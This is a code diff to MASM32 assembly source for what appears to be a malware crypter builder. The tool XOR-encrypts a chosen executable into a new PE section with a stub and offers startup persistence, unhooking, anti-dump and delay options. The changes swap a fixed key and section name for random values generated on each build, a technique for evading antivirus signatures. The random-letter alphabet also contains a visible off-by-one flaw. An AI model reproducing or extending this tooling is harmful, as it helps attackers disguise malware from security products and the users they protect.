@@ -29,7 +29,8 @@ DlgProc PROTO :HWND, :UINT, :WPARAM, :LPARAM
     IDD_DIALOG1    equ 101
 
 .data
-  szBitmapPath db "Res\header.bmp",0
+
+ 	szBitmapPath db "Res\header.bmp",0
     szFilter       db "Executable Files (*.exe)", 0, "*.exe", 0, 0
     ofn            OPENFILENAME <>
     sfn            OPENFILENAME <>
@@ -48,9 +49,7 @@ DlgProc PROTO :HWND, :UINT, :WPARAM, :LPARAM
     szCurrentDir   db 260 dup(0)
     szWorkingDir   db 260 dup(0)
     szTempFile db "stub.tmp", 0
-	custom_key     db "MEOW", 0
 	stub_file    db "stub.bin", 0
-	new_section_name db ".meow", 0, 0, 0
 	str_startup_nop   db "STARTUP_NOP", 0
 	str_startup_yes   db "STARTUP_YES", 0
 	str_unhook_nop    db "UNHOOK_NOP", 0
@@ -61,7 +60,9 @@ DlgProc PROTO :HWND, :UINT, :WPARAM, :LPARAM
 	str_delay_yes     db "DELAY_YES", 0
 	str_secret        db "SECRET", 0
 	output_file db "payload.xyris", 0
-
+	
+Rndm			dd	0
+B32Chars		db	"ABCDEFGHIJKLMNOPQRSTUVXYZ",0
 
 
 .data?
@@ -78,7 +79,8 @@ DlgProc PROTO :HWND, :UINT, :WPARAM, :LPARAM
 	xWin dd ?
 	hBitmap dd ?
 	bitmp dd ?
-
+	szKey	db	100h	dup(?)
+	szSection	db	100h	dup(?)
 .code
 start:
     invoke GetModuleHandle, NULL
@@ -86,6 +88,32 @@ start:
     invoke InitCommonControls
     invoke DialogBoxParam, hInstance, IDD_DIALOG1, NULL, addr DlgProc, NULL
     invoke ExitProcess, 0
+
+;Randomize and GenRandomNumbers -> https://github.com/Xyl2k/Xylitol-MASM32-snippets/blob/master/Random/Numbers-letters/keygen.asm
+Randomize PROC uses ecx
+	invoke	GetTickCount
+	add Rndm,eax
+	add Rndm,eax
+	add Rndm,'abcd'
+	Rol Rndm,1
+	mov eax,Rndm
+;	imul eax,'seed'
+	Ret
+Randomize ENDP
+GenRandomNumbers	PROC uses ebx	pIn:DWORD,pLen:DWORD
+	mov edi,pIn
+	mov ebx,pLen
+	.repeat
+		invoke	Randomize
+		mov ecx,26			
+		xor edx,edx
+		idiv ecx
+		movzx eax,byte ptr [edx+B32Chars]
+		stosb
+		dec ebx
+	.until zero?
+	Ret
+GenRandomNumbers ENDP
 
 
 align_to PROC val:DWORD, alignment:DWORD
@@ -168,7 +196,6 @@ add_section PROC target_file:DWORD
     mov file_size, eax
     
     mov eax, input_size
-    add eax, 1000h
     add eax, file_size
     mov aligned_size, eax
     
@@ -225,7 +252,7 @@ add_section PROC target_file:DWORD
     mov new_section, edi
     
     push edi
-    lea esi, new_section_name
+    lea esi, szSection
     mov ecx, 8
     rep movsb
     pop edi
@@ -257,7 +284,7 @@ add_section PROC target_file:DWORD
     
     mov edx, new_section
     mov eax, IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_WRITE or IMAGE_SCN_CNT_INITIALIZED_DATA 
-    mov [edx + 24h], eax      ; Characteristics
+    mov [edx + 24h], eax
     
     mov cx, word ptr [ebx + 6]
     inc cx
@@ -281,15 +308,7 @@ add_section PROC target_file:DWORD
     mov ecx, input_size
     rep movsb
      
-   mov eax, input_size
-    xor edx, edx
-    div file_align           
-    .if edx != 0            
-        mov ecx, file_align
-        sub ecx, edx         
-        xor al, al
-        rep stosb            
-    .endif
+
    
     invoke FlushViewOfFile, pMapping, 0
     invoke UnmapViewOfFile, pMapping
@@ -299,7 +318,6 @@ add_section PROC target_file:DWORD
     mov eax, 1
     ret
 add_section ENDP
-
 strlen PROC string:DWORD
     LOCAL len:DWORD
     mov len, 0
@@ -371,7 +389,6 @@ process_pattern PROC uses ebx esi edi data:DWORD, dataSize:DWORD, search:DWORD, 
 process_pattern ENDP
 
 scan_and_replace PROC uses ebx esi edi hFile:HANDLE, startup:DWORD, unhook:DWORD, antidump:DWORD,delay:DWORD, key:DWORD
-    
     LOCAL hMapping:HANDLE
     LOCAL fileData:DWORD
     LOCAL fileSize:DWORD
@@ -485,7 +502,7 @@ Decrypt PROC uses eax esi edi ebx section:DWORD, size_var:DWORD, outBuffer:DWORD
         
         .while ecx > 0
             mov al, [esi]
-            xor al, byte ptr custom_key[edx]
+            xor al, byte ptr szKey[edx]
             mov [edi], al
             
             inc esi
@@ -529,7 +546,6 @@ save_file PROC filepath:DWORD, buffer:DWORD, size_val:DWORD
     mov eax, 1
     ret
 save_file ENDP
-
 DlgProc PROC hWin:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM
    LOCAL wID:WORD
    LOCAL hFile:HANDLE
@@ -580,6 +596,11 @@ DlgProc PROC hWin:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM
        mov wID, ax
        
        .if wID == IDC_BTNOPEN
+       
+  		   invoke GenRandomNumbers,addr szKey, 6
+  		   invoke GenRandomNumbers,addr szSection, 6
+ 
+      
            mov ofn.lStructSize, sizeof OPENFILENAME
            push hWin
            pop ofn.hwndOwner
@@ -671,7 +692,7 @@ DlgProc PROC hWin:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM
                            unhook,\
                            antidump,\
                            delay,\
-                           addr custom_key
+                           addr szKey
 
                invoke CloseHandle, hFile
 
